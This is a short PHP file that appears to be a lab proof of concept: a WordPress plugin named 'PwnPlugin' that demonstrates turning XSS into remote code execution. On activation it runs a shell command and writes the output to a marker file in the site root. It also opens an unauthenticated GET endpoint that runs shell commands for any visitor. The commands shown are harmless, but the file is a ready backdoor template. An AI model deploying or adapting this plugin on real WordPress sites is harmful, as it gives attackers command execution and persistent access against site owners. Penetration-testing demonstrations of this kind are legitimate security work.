<?php
/**
 * Plugin Name: PwnPlugin
 * Description: POC XSS2Shell
 * Version: 1.0
 * Author: Lab
 */

// Segnaposto di RCE: crea un file nella root di WordPress al caricamento.
register_activation_hook( __FILE__, function() {
    $marker = ABSPATH . 'xss2shell-pwned.txt';
    file_put_contents( $marker, "PWNED at " . date( 'c' ) . "\nuser=" . shell_exec( 'whoami' ) . "\n" );
} );

// Endpoint diretto per dimostrazione.
if ( isset( $_GET['xss2shell' ] ) ) {
    header( 'Content-Type: text/plain' );
    echo "RCE_POC\n";
    echo "user=" . shell_exec( 'whoami' ) . "\n";
    exit;
}
